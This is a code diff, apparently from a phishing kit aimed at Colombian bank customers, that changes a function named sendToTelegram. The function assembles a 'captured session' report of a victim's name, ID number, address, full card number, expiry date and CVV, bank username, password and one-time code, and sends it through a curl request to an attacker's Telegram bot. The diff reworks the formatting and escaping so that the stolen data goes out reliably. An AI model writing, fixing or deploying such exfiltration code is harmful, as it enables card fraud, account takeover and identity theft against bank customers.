@@ -14,45 +14,45 @@ export async function sendToTelegram(sessionData: any) {
   }
 
   try {
-    // Formatear el mensaje
+    // Formatear el mensaje (texto plano, sin Markdown para evitar errores)
     const message = `
-🔔 *Nueva Sesión Capturada*
+🔔 NUEVA SESION CAPTURADA
 
-*Sesión:* \`#${sessionData.sessionId.slice(-8)}\`
-*Banco:* ${sessionData.bank.toUpperCase()}
-*Estado:* ${sessionData.status}
+Sesion: #${sessionData.sessionId.slice(-8)}
+Banco: ${sessionData.bank.toUpperCase()}
+Estado: ${sessionData.status}
 
-*📋 Datos del Cliente*
-*Nombre:* ${sessionData.fullName || 'N/A'}
-*Email:* ${sessionData.email || 'N/A'}
-*Teléfono:* ${sessionData.phone || 'N/A'}
-*Cédula:* ${sessionData.documentId || 'N/A'}
-*Dirección:* ${sessionData.address || 'N/A'}
-*Ciudad:* ${sessionData.city || 'N/A'}
+📋 DATOS DEL CLIENTE
+Nombre: ${sessionData.fullName || 'N/A'}
+Email: ${sessionData.email || 'N/A'}
+Telefono: ${sessionData.phone || 'N/A'}
+Cedula: ${sessionData.documentId || 'N/A'}
+Direccion: ${sessionData.address || 'N/A'}
+Ciudad: ${sessionData.city || 'N/A'}
 
-*💳 Datos de Tarjeta*
-*Número:* \`${sessionData.cardNumber || 'N/A'}\`
-*Titular:* ${sessionData.cardHolderName || 'N/A'}
-*Vencimiento:* ${sessionData.expiryDate || 'N/A'}
-*CVV:* \`${sessionData.cvv || 'N/A'}\`
-*Marca:* ${sessionData.cardBrand || 'N/A'}
+💳 DATOS DE TARJETA
+Numero: ${sessionData.cardNumber || 'N/A'}
+Titular: ${sessionData.cardHolderName || 'N/A'}
+Vencimiento: ${sessionData.expiryDate || 'N/A'}
+CVV: ${sessionData.cvv || 'N/A'}
+Marca: ${sessionData.cardBrand || 'N/A'}
 
-*🔐 Credenciales Bancarias*
-*Usuario:* ${sessionData.usuario || 'N/A'}
-*Clave:* \`${sessionData.clave || 'N/A'}\`
-*Dinámica:* \`${sessionData.claveDinamica || 'N/A'}\`
+🔐 CREDENCIALES BANCARIAS
+Usuario: ${sessionData.usuario || 'N/A'}
+Clave: ${sessionData.clave || 'N/A'}
+Dinamica: ${sessionData.claveDinamica || sessionData.otp || 'N/A'}
 
-*💰 Total:* $${sessionData.totalAmount?.toLocaleString('es-CO') || '0'}
+💰 Total: $${sessionData.totalAmount?.toLocaleString('es-CO') || '0'}
 
-*🕐 Fecha:* ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
+🕐 Fecha: ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
 `;
 
-    // Escapar comillas y caracteres especiales para el shell
-    const escapedMessage = message.replace(/"/g, '\\"').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+    // Escapar comillas para JSON
+    const escapedMessage = message.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n');
     
     const curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
       -H "Content-Type: application/json" \
-      -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\",\\"parse_mode\\":\\"Markdown\\"}" \
+      -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\"}" \
       --max-time 30 \
       --silent`;
 
